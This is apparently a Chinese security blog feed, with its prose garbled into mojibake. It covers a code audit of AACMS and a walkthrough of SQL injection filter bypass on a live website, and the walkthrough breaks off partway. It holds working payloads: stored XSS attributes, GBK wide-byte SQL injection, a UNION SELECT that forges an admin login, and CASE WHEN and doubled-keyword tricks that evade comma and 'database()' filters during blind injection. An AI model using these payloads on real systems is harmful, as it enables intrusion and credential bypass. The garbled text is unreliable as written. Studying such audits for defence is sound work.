<code>title=1&amp;url=1%2527,1),(user(),1,2)%23</code></p><p>æˆ–æ˜¯ï¼š<code>title=1&amp;url=1%2527,0),(2,user(),1)%23</code>ï¼Œéƒ½èƒ½å¤Ÿå®ç°</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/11.png"></p><p>å½“ç„¶ï¼Œè¿™é‡Œå…¶å®ä¸ç”¨çœ‹ä»£ç éƒ½èƒ½å¤Ÿå‘ç°ï¼Œå¤§æ¦‚ç‡å­˜åœ¨å­˜å‚¨å‹çš„è·¨ç«™</p><p><code>payload:</code> <code>title=&lt;img src=1 onerror=alert(1)&gt;&amp;url=1</code>éœ€è¦è¿›è¡Œurlç¼–ç </p><p><code>payload:</code> <code>title=%3c%69%6d%67%20%73%72%63%3d%31%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e&amp;url=1</code></p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/12.png"></p><h6 id="3-XSSæ¼æ´"><a href="#3-XSSæ¼æ´" class="headerlink" title="3.XSSæ¼æ´"></a>3.XSSæ¼æ´</h6><p>å…ˆè·Ÿç€å¤§ä½¬çš„æ€è·¯èµ°</p><p>å›åˆ°admin_misc.phpä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu&#x27;</span>) &#123;<br><br><span class="hljs-variable">$optionlist</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$query</span> = DB::query(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; ORDER BY displayorder&quot;</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$custom</span> = DB::fetch(<span class="hljs-variable">$query</span>)) &#123;<br><span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;url&#x27;</span>] = rawurldecode(<span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-variable">$optionlist</span> .= showtablerow(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;class=&quot;td25&quot;&#x27;</span>, <span class="hljs-string">&#x27;class=&quot;td28&quot;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;class=&quot;td26&quot;&#x27;</span>), <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;&lt;input type=\&quot;checkbox\&quot; class=\&quot;checkbox\&quot; name=\&quot;delete[]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[id]\&quot;&gt;&quot;</span>,<br><span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;3\&quot; name=\&quot;displayorder[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[displayorder]\&quot;&gt;&quot;</span>,<br><span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;25\&quot; name=\&quot;title[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;&quot;</span>.cplang(<span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;title&#x27;</span>]).<span class="hljs-string">&quot;\&quot;&gt;&quot;</span>,<br><span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;40\&quot; name=\&quot;url[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[url]\&quot;&gt;&quot;</span><br>), <span class="hljs-literal">TRUE</span>);<br>&#125;<br><br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;misc_custommenu&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨å‰é¢çš„é€šè¯»ä¸­ï¼Œå·²çŸ¥è¯¥ç³»ç»Ÿå¹¶æ²¡æœ‰å¯¹XSSè¿›è¡Œç›¸å…³æ ¡éªŒï¼Œè€Œå°±ç®—è¾“å…¥ç»è¿‡<code>addslashes()</code>è¿‡æ»¤ï¼Œä¹Ÿå¹¶ä¸ä¼šå½±å“å‰æ®µHTMLæ ‡ç­¾çš„åŠ è½½ï¼Œæ‰€ä»¥ä¸Šè¿°ä»£ç ä¸­<code>$custom[url]</code>å’Œ<code>$custom[&#39;title&#39;]</code>éƒ½å¯èƒ½å­˜åœ¨XSSæ¼æ´</p><p>æ ¹æ®å‰æ®µé¡µé¢çš„æƒ…å†µæ„é€ payload</p><p><code>url=&quot; onclick=&quot;alert(1)</code></p><p><code>title=&quot; onclick=&quot;alert(1)</code></p><p>éœ€è¦è¿›è¡Œurlç¼–ç åå‘é€</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/14.png"></p><p>ä½†è¿™é‡Œçš„ï¼Œå¦‚æœæµ‹è¯•XSSæ¼æ´çš„è¯ï¼Œå¯èƒ½é»‘ç›’ä¼šæ›´å¿«ä¸€äº›ï¼Œå› ä¸ºå·²ç»çŸ¥é“äº†webåº”ç”¨æ²¡æœ‰å¯¹XSSè¿›è¡Œä¸€ä¸ªæ ¡éªŒï¼Œæ‰€ä»¥èƒ½æ’å…¥çš„åœ°æ–¹ï¼Œå°±ä½¿åŠ²æ’å…¥payloadï¼Œç™½ç›’å¯ä»¥å°‘ä¸€äº›ã€‚</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/13.png"></p><h5 id="æ— æ³•å¤ç°çš„æ¼æ´"><a href="#æ— æ³•å¤ç°çš„æ¼æ´" class="headerlink" title="æ— æ³•å¤ç°çš„æ¼æ´"></a>æ— æ³•å¤ç°çš„æ¼æ´</h5><h6 id="1-ç™»å½•ä½ç½®çš„å®½å­—èŠ‚æ³¨å…¥"><a href="#1-ç™»å½•ä½ç½®çš„å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="1.ç™»å½•ä½ç½®çš„å®½å­—èŠ‚æ³¨å…¥"></a>1.ç™»å½•ä½ç½®çš„å®½å­—èŠ‚æ³¨å…¥</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;login&#x27;</span>) &#123;<br><br><span class="hljs-keyword">if</span>(submitcheck(<span class="hljs-string">&#x27;loginsubmit&#x27;</span>)) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_password&#x27;</span>];<br><br><span class="hljs-variable">$member</span> = DB::getRow(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;member&#x27;</span>).<span class="hljs-string">&quot; WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$password</span> = md5(md5(<span class="hljs-variable">$password</span>).<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;salt&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span> == <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &amp;&amp; <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;uid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] ? unserialize(<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br>dheader(ADMINSCRIPT);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br>@<span class="hljs-keyword">include_once</span> ROOT.<span class="hljs-string">&#x27;./source/aacms_version.php&#x27;</span>;<br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;member_login&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>$username</code>ç›´æ¥æ‹¼æ¥è¿›æŸ¥è¯¢è¯­å¥ï¼Œç”±äºæ•°æ®åº“ç¼–ç ä¸ºGBKï¼Œæ‰€ä»¥å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼Œæ’å…¥payloadä¹‹åï¼Œæ•°æ®åº“æ‰§è¡Œæ—¥å¿—å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">QuerySELECT * FROM pre_member WHERE username=&#x27;adminé‹&#x27; or updatexml(1,concat(1,user()),1)#&#x27;<br># å°†è¯¥è¯­å¥ä»£å…¥æ•°æ®åº“ä¸­è¿›è¡Œæ‰§è¡Œï¼Œå‘ç°æ˜¯èƒ½å¤ŸæˆåŠŸæ‰§è¡Œçš„ï¼Œè€Œè¯¥webåº”ç”¨æ²¡æœ‰è¿”å›æ•°æ®åº“æŠ¥é”™ä¿¡æ¯ï¼Œç›´æ¥301ï¼Œæ‰€ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥æ— æ³•å®ç°ï¼ŒçŒœæµ‹æ˜¯è¿™é‡Œæ²¡æœ‰å¼€å¯æŠ¥é”™ä¿¡æ¯<br># ä½¿ç”¨æ—¶é—´ç›²æ³¨ï¼Œå‘ç°æ— æ³•è¿›è¡Œå»¶æ—¶ï¼Œæ•°æ®åº“æœ€ç»ˆæ‰§è¡Œçš„payloadå¯ä»¥è¿›è¡Œå»¶è¿Ÿï¼Œæœªå‘ç°åŸå› <br># å †å æ³¨å…¥åŒæ ·æ— æ³•è¿›è¡Œ<br></code></pre></td></tr></table></figure><h6 id="2-åå°ä¸‡èƒ½å¯†ç ç™»å½•"><a href="#2-åå°ä¸‡èƒ½å¯†ç ç™»å½•" class="headerlink" title="2.åå°ä¸‡èƒ½å¯†ç ç™»å½•"></a>2.åå°ä¸‡èƒ½å¯†ç ç™»å½•</h6><p>è¿˜æ˜¯ä¸Šé¢çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;login&#x27;</span>) &#123;<br><br><span class="hljs-keyword">if</span>(submitcheck(<span class="hljs-string">&#x27;loginsubmit&#x27;</span>)) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_password&#x27;</span>];<br><br><span class="hljs-variable">$member</span> = DB::getRow(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;member&#x27;</span>).<span class="hljs-string">&quot; WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$password</span> = md5(md5(<span class="hljs-variable">$password</span>).<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;salt&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span> == <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &amp;&amp; <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;uid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] ? unserialize(<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br>dheader(ADMINSCRIPT);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br>@<span class="hljs-keyword">include_once</span> ROOT.<span class="hljs-string">&#x27;./source/aacms_version.php&#x27;</span>;<br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;member_login&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ç”¨æˆ·çš„å¯†ç è§£ä¸å‡ºæ¥æ—¶ï¼Œä¸Šé¢çš„å®½å­—èŠ‚æ³¨å…¥æ¼æ´å°±æ˜¾å¾—æ²¡å¤šå¤§ç”¨äº†ï¼Œæ‰€ä»¥ä¸€ä¸ªä¸‡èƒ½å¯†ç æ˜¯å¾ˆé‡è¦çš„ï¼Œè¿™é‡Œç”±äºæ²¡æœ‰å¤ç°æˆåŠŸï¼Œæ‰€ä»¥å°±è‡ªå·±æ‹ä¸€ä¸‹æ€è·¯å§ï¼Œä¸ºä¸‹æ¬¡ç¢°è§ç±»ä¼¼åšä¸ªå‡†å¤‡</p><p>é¦–å…ˆç¨‹åºæ ¹æ®<code>$username</code>å­—æ®µå»æ•°æ®åº“ä¸­æŸ¥å–å“åº”çš„è´¦å·ä¿¡æ¯</p><p>ç„¶åå¯¹è¾“å…¥çš„å¯†ç è¿›è¡Œä¸€ä¸ªåŠ ç›åŠ å¯†</p><p>æ¯”å¯¹å¯†ç åŒæ—¶åˆ¤æ–­è¯¥è´¦å·æ˜¯å¦ä¸ºç®¡ç†å‘˜</p><p>OKï¼Œç”±äºåœ¨æ ¹æ®<code>$username</code>å»æ•°æ®åº“æŸ¥è¯¢å¤„å­˜åœ¨sqlæ³¨å…¥ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨è”åˆæŸ¥è¯¢è¦†ç›–æ‰åŸæ¥çš„æŸ¥è¯¢æ•°æ®ï¼Œè®©æ•°æ®åº“è¿”å›æƒ³è¦çš„æ•°æ®</p><p>æ ¹æ®æ•°æ®åº“çš„å­—æ®µï¼Œå¯ä»¥è¿›è¡Œpayloadçš„æ„é€ </p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/19.png"></p><p><code>&amp;admin_username=zzz%df&#39; UNION SELECT 1,2,0x6433356536363866373765653433326661646534396637643763666436616434,4,1,6,7,8,9,10,11,12,13 -- &amp;admin_password=3</code></p><p>å…¶ä¸­å­—æ®µä¸‰ä¸ºæ•°æ®åº“åŠ å¯†åçš„å¯†ç ï¼Œå­—æ®µäº”<code>groupid</code>å¿…é¡»ä¸º1ï¼Œå­—æ®µä¹<code>salt</code>ç”¨äºå­—æ®µä¸‰åŠ å¯†</p><p>æ•°æ®åº“æœ€ç»ˆæ‰§è¡Œè¯­å¥å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM pre_member WHERE username=&#x27;zzzé‹&#x27; UNION SELECT 1,2,0x6433356536363866373765653433326661646534396637643763666436616434,4,1,6,7,8,9,10,11,12,13 -- &#x27;<br></code></pre></td></tr></table></figure><p>ä»£å…¥æ•°æ®åº“æŸ¥è¯¢ï¼Œè¿”å›çš„ä¹Ÿæ˜¯æƒ³è¦çš„å€¼</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/20.png"></p><p>ä½†å°±æ˜¯æ— æ³•æˆåŠŸå¤ç°ï¼ŒåŸå› ä»æœªå‘ç°ğŸ˜­</p><p>çœŸèœï¼Œå¤ç°éƒ½å¤ç°ä¸å‡ºæ¥ğŸ˜’</p><h4 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h4><p><a href="https://www.freebuf.com/vuls/229981.html">https://www.freebuf.com/vuls/229981.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>PHPä»£ç å®¡è®¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å°ç ´ç«™çš„SQLç»•è¿‡</title>
    <link href="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/"/>
    <url>/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>è¿™ç¯‡æ–‡ç« ä¸­çš„ç«™ç‚¹æ˜¯ä»¥å‰å‘ç°çš„äº†ï¼Œæ¼æ´ä¹Ÿæ˜¯ä»¥å‰æçš„ï¼Œä½†æ˜¯æœ€è¿‘æˆ‘è§‰ç€æˆ‘å¤§å“¥éœ€è¦æ‰¾ç‚¹ä¸œè¥¿ç»ƒç»ƒæ‰‹ï¼Œç„¶åå°±æŠŠè¿™ä¸ªä¸¢ç»™äº†å¤§å“¥ï¼Œç»“æœå¤§å“¥æ€»æ˜¯åœ¨æ‰¾ç†ç”±æ¨è„±ï¼ˆå¤§å“¥ä¹Ÿæƒ³æï¼Œä½†æ€»æ˜¯æ‰¾å€Ÿå£è¯´æ²¡æ—¶é—´ï¼‰ï¼Œç„¶åæˆ‘è·Ÿå¤§å“¥è¯´ï¼Œä½ å†ä¸ææˆ‘å°±ç›´æ¥æŠŠæ€è·¯è¿‡ç¨‹å‘ç»™ä½ ï¼Œæ¶å¿ƒå¤§å“¥ä¸€æ‰‹ã€‚æ²¡é”™ï¼Œè¿™ç¯‡æ–‡ç« å°±æ˜¯æ‹¿æ¥æ¶å¿ƒæˆ‘å¤§å“¥ä¸€æ‰‹çš„</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/1.png"></p><h4 id="æ³¨å…¥è¿‡ç¨‹"><a href="#æ³¨å…¥è¿‡ç¨‹" class="headerlink" title="æ³¨å…¥è¿‡ç¨‹"></a>æ³¨å…¥è¿‡ç¨‹</h4><p>è¿™ä¸ªç«™ç‚¹å¥½åƒæ˜¯è¡¥å¤©å…¬ç›Šé‡Œé¢çš„ä¸€ä¸ªï¼Œè‡³äºæ³¨å…¥ç‚¹æ˜¯æ€ä¹ˆæ‰¾åˆ°çš„å°±è®°ä¸æ¸…äº†ï¼Œæ‰€ä»¥å°±ç›´æ¥å¼€æ</p><p><code>and 1=1</code>ï¼Œ<code>and 1=2</code>,å±¡è¯•ä¸çˆ½,ç»“æœGGï¼Œç›´æ¥ç™½å±å•¥éƒ½ä¸æ˜¾ç¤ºå¥½å§</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/2.png"></p><p>andä¸è¡Œï¼Œé‚£å°±è¯•ä¸€ä¸‹orï¼Œå¥½å®¶ä¼™ï¼Œä¹Ÿæ˜¯ä¸è¡Œï¼Œä½†æ˜¯è¯•ä¸€ä¸‹ç›´æ¥<code>video_id=0 or 1</code>ï¼Œå› ä¸º1ä¹Ÿæ˜¯ä»£è¡¨TRUEï¼Œä¸é”™ï¼Œä¸é”™  å¯è¡Œï¼Œæ³¨æ„æ­¤æ—¶é¡µé¢åœ¨ä¼šåŠ¡å°ç¨‹åºå¤„åå›äº†å¾ˆå¤šå°è§†é¢‘</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/3.png"></p><p>å†è¯•ä¸€ä¸‹<code>video_id=0 or 0</code>ï¼Œå°è§†é¢‘æ²¡äº†ï¼Œè¿™åŸºæœ¬å¯ä»¥ç¡®å®šå¸ƒå°”ç›²æ³¨æ²¡è·‘äº†</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/4.png"></p><p>åé¢å‘ç°ç›´æ¥<code>video_id=0</code>å’Œ<code>video_id=1</code>ä¹Ÿæ˜¯èƒ½å‘ç°é¡µé¢å›æ˜¾ä¸ä¸€æ ·çš„ï¼Œé‚£è¿™é‡Œè‚¯å®šè¦è¯•ä¸€ä¸‹æŠ¥é”™</p><p>æ—¢ç„¶æ˜¯å¸ƒå°”ç›²æ³¨ï¼Œé‚£è‚¯å®šè¦å…ˆåˆ¤æ–­ä¸€ä¸‹database()çš„é•¿åº¦ï¼Œä¸è¿‡è¿™æ˜¯é—®é¢˜å°±æ¥äº†ï¼Œä¸€èˆ¬å¸ƒå°”ç›²æ³¨è‚¯å®šä¼˜å…ˆç”¨ifï¼Œ</p><p>ç›´æ¥å°è¯•<code>video_id=0 or if(length(database())=10,1,0)</code></p><p>ç›´æ¥æŠ¥é”™</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/5.png"></p><p>å¥½å®¶ä¼™ï¼Œç›´æ¥æŠ¥é”™ï¼Œæ˜¾ç¤º<code>())=1010</code>ä½ç½®é”™è¯¯ï¼Œè€Œè¾“å…¥çš„æ˜¯<code>if(length(database())=10,1,0)</code>,èƒ½å¤Ÿåˆ¤æ–­é€—å· <strong>,</strong> é€—å·æ— äº†ï¼Œè€Œifå¿…é¡»è¦ä½¿ç”¨é€—å·(åœ¨æˆ‘çš„è®¤çŸ¥ä¸­æ˜¯å¿…é¡»è¦ä½¿ç”¨é€—å·çš„)ï¼Œä½œä¸ºèœé¸¡çš„æˆ‘ï¼Œä¸€æ—¶é—´ä¸çŸ¥é“è¯¥å¦‚ä½•äº†ã€‚ä½†è¿™é‡Œéœ€è¦è®°ä¸€ä¸‹ï¼Œé€—å·è¢«è¿‡æ»¤æ‰äº†ï¼Œåé¢ç»•è¿‡è¿‡ç¨‹ä¸­ä¼šç”¨åˆ°</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/6.png"></p><p>æ‹¿å‡ºæˆ‘çš„MySQLæ‰‹å†Œï¼Œæ‰“å¼€ï¼Œç¿»æ‰¾ï¼Œå‘ç°æˆ‘çœŸèœï¼Œèƒ½å°±åªæœ‰ä¸€ä¸ªifå˜›ï¼Ÿï¼Ÿï¼Ÿè‚¯å®šè¿˜æœ‰å…¶ä»–çš„åˆ¤æ–­è¯­å¥ï¼Œæœä¸å…¶ç„¶ï¼Œæœ‰<code>when</code>,è€Œä¸”<code>when</code>è¿˜æ²¡æœ‰é€—å·ï¼Œå®Œç¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># whenè¯­å¥ç”¨æ³• conditionæ˜¯ä¸€ä¸ªè¿”å›å¸ƒå°”ç±»å‹çš„è¡¨è¾¾å¼ï¼Œå¦‚æœè¡¨è¾¾å¼è¿”å›trueï¼Œåˆ™æ•´ä¸ªå‡½æ•°è¿”å›ç›¸åº”resultçš„å€¼ï¼Œå¦‚æœè¡¨è¾¾å¼çš†ä¸ºfalseï¼Œåˆ™è¿”å›ElSEåresultçš„å€¼ï¼Œå¦‚æœçœç•¥äº†ELSEå­å¥ï¼Œåˆ™è¿”å›NULLã€‚<br>CASE WHEN condition THEN result<br>[WHEN...THEN...]<br>ELSE result<br>END<br></code></pre></td></tr></table></figure><p>å°è¯•ä¸€ä¸‹<code>video_id=0 or (case when 1=2 then 1 else 0 end)</code>å’Œ<code>video_id=0 or (case when 1=1 then 1 else 0 end)</code></p><p>å‘ç°é¡µé¢å·²ç»ä¸æŠ¥é”™äº†ï¼Œå¹¶ä¸”è¿”å›å†…å®¹ä¹Ÿä¸ç›¸åŒï¼Œè¿™æ ·å¯ä»¥ç»§ç»­å¾€ä¸‹äº†</p><p>å†è¯•ä¸€ä¸‹<code>video_id=0 or (case when length(database())=10 then 1 else 0 end)</code>,å¥½äº†ï¼Œåˆä¸è¡Œ</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/7.png"></p><p>çœ‹æ¥è¿™é‡Œä¸æ˜¯<code>length()</code>ï¼Œå°±æ˜¯<code>database()</code>çš„é—®é¢˜äº†</p><p>å…ˆè¯•ä¸€ä¸‹<code>length()</code>èƒ½ä¸èƒ½ä½¿ç”¨ï¼Œ<code>video_id=0 or (case when length(123)=3 then 1 else 0 end)</code>ï¼Œ</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/8.png"></p><p>å‘ç°èƒ½ç”¨ï¼Œé‚£è‚¯å®šæ˜¯å¯¹<code>database()</code>è¿›è¡Œäº†æ£€æµ‹è¿‡æ»¤</p><p>é‚£è¾“å…¥<code>video_id=0 or (case when length(zzzdataqqqbasexxx())=3 then 1 else 0 end)</code>æ¥è¯•ä¸€ä¸‹ï¼Œå¥½å®¶ä¼™è¯¥æœ‰çš„åŸºæœ¬æ²¡æœ‰ï¼Œä¸è¯¥æœ‰çš„éƒ½æœ‰ï¼Œä½†æ³¨æ„<code>database()</code>ä¸­çš„<code>base</code>è¢«è¿‡æ»¤æ‰äº†.ï¼ˆå…¶å®è¿™é‡Œå·²ç»å¾—åˆ°<code>database()</code>çš„å€¼äº†ï¼Œä½†è¿™é‡Œæ˜¯è®²ç»•è¿‡ï¼Œæ‰€ä»¥ç»§ç»­ç»•ï¼‰</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/9.png"></p><p><code>base</code>æ— äº†ï¼Œé‚£æˆ‘å†™ä¸¤ä¸ªå¥½å§ï¼Œ<code>video_id=0 or (case when length(datababasese())=8 then 1 else 0 end)</code></p><p>æˆåŠŸï¼Œè¿™å°±å¾ˆniceäº†ï¼Œå¾—åˆ°<code>database()</code>çš„é•¿åº¦ä¸º8</p><p><img 